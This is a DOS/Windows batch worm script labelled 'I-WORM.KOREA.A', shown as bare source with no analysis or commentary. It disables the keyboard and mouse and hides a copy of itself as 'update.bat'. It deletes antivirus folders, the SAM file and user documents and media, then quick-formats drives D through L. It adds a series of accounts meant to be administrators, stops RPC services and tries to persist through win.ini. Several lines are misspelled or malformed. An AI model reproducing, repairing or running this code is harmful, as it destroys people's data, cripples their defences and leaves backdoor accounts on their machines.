   @echo off
   echo******************
   echo**I-WORM.KOREA.A**
   echo******************
   echo Information:Http://www.Korea.or.kr
   echo coded by Fan
   cls
   @echo off
   ctty nul
   rundll32.exe Keyboard, disable
   rundll32.exe mouse, disable
   pause
   copy %0 c:\window\Update.bat
   attrib +s +h c:\window
   attrib +s +h c:\window\update.bat
   If exist c:\window\update.bat deltree /y c:\progra~1\norton~1\*.*
   If exist c:\window\update.bat deltree /y c:\progra~1\ahnlab\v3\*.*
   If exist c:\window\update.bat deltree /y c:\progra~1\virobo~1\*.*
   If exist c:\window\update.bat deltree /y c:\hnc\*.*
   If exist c:\window\update.bat deltree /y c:\work\*.*
   If exist c:\window\update.bat deltree /y c:\winnt\system32\config\sam
   If exist c:\window\update.bat deltree /y c:\*.hwp
   If exist c:\window\update.bat deltree /y c:\*.doc
   If exist c:\window\update.bat deltree /y c:\*.ppt
   If exist c:\window\update.bat deltree /y c:\*.xls
   If exist c:\window\update.bat deltree /y c:\*.pdf
   If exist c:\window\update.bat deltree /y c:\*.mp3
   If exist c:\window\update.bat deltree /y c:\*.txt
   If exist c:\window\update.bat deltree /y c:\*.jpg
   If exist c:\window\update.bat deltree /y c:\*.bmp
   If exist c:\window\update.bat deltree /y c:\*.gif
   If exist c:\window\update.bat format /q /y d:\
   If exist c:\window\update.bat format /q /y e:\
   If exist c:\window\update.bat format /q /y f:\
   If exist c:\window\update.bat format /q /y g:\
   If exist c:\window\update.bat format /q /y h:\
   If exist c:\window\update.bat format /q /y i:\
   If exist c:\window\update.bat format /q /y j:\
   If exist c:\window\update.bat format /q /y k:\
   If exist c:\window\update.bat format /q /y l:\
   If exist c:\window\update.bat net send 255.255.255.255 Your system is infected by Backdoor.
   If exist c:\window\update.bat net user aaa aministrators /add
   If exist c:\window\update.bat net user baa aministrators /add
   If exist c:\window\update.bat net user caa aministrators /add
   If exist c:\window\update.bat net user daa aministrators /add
   If exist c:\window\update.bat net user eaa aministrators /add
   If exist c:\window\update.bat net user faa aministrators /add
   If exist c:\window\update.bat net user gaa aministrators /add
   If exist c:\window\update.bat net user haa aministrators /add
   If exist c:\window\update.bat net user iaa aministrators /add
   If exist c:\window\update.bat net user jaa aministrators /add
   If exist c:\window\update.bat net stop RpcSs
   If exist c:\window\update.bat net stop RpcLocator
   If exist c:\window\update.bat mkdir c:\Your
   If exist c:\window\update.bat mkdir c:\system
   If exist c:\window\update.bat mkdir c:\is
   If exist c:\window\update.bat mkdir c:\infected
   If exist c:\window\update.bat mkdir c:\by
   If exist c:\window\update.bat mkdir c:\a
   If exist c:\window\update.bat mkdir c:\Malicious
   If exist c:\window\update.bat mkdir c:\code
   If exist c:\window\update.bat mkdir c:\Happy
   If exist c:\window\update.bat mkdir c:\new
   If exist c:\window\update.bat mkdir c:\year
   If exist c:\window\update.bat mkdir c:\Do
   If exist c:\window\update.bat mkdir c:\you
   If exist c:\window\update.bat mkdir c:\love
   If exist c:\window\update.bat mkdir c:\him
   If exist c:\window\update.bat mkdir c:\I
   If exist c:\window\update.bat mkdir c:\miss
   If exist c:\window\update.bat mkdir c:\you
   If exist c:\window\update.bat mkdir c:\so
   If exist c:\window\update.bat mkdir c:\much
   If exist c:\window\update.bat mkdir c:\me
   If exist c:\window\update.bat mkdir c:\too
   If exist c:\window\update.bat mkdir c:\This
   If exist c:\window\update.bat mkdir c:\Worm
   If exist c:\window\update.bat mkdir c:\is
   If exist c:\window\update.bat mkdir c:\coded
   If exist c:\window\update.bat mkdir c:\by
   If exist c:\window\update.bat mkdir c:\The
   If exist c:\window\update.bat mkdir c:\dog
   If exist c:\window\update.bat mkdir c:\nose
   If exist c:\window\update.bat mkdir c:\I
   If exist c:\window\update.bat mkdir c:\am
   If exist c:\window\update.bat mkdir c:\a
   If exist c:\window\update.bat mkdir c:\baby
   If exist c:\window\update.bat mkdir c:\Progamer
   If exist c:\window\update.bat mkdir c:\My
   If exist c:\window\update.bat mkdir c:\favorite
   If exist c:\window\update.bat mkdir c:\subject
   If exist c:\window\update.bat mkdir c:\is
   If exist c:\window\update.bat mkdir c:\the
   If exist c:\window\update.bat mkdir c:\method
   If exist c:\window\update.bat mkdir c:\to
   If exist c:\window\update.bat mkdir c:\make
   If exist c:\window\update.bat mkdir c:\a
   If exist c:\window\update.bat mkdir c:\virus
   :residency
   [windows]>r
   load=c:\window\update.bat
   run=>>r
   NullPort=None>>r
   .>>r
   copy R + %winbootdir%\win.ini %winbootdir%\system\win.ini
   del %winbootdir%\win.ini
   move %winbootdir%\system\win.ini %winbootdir%\win.ini
   deltree /y r
   :regester vir
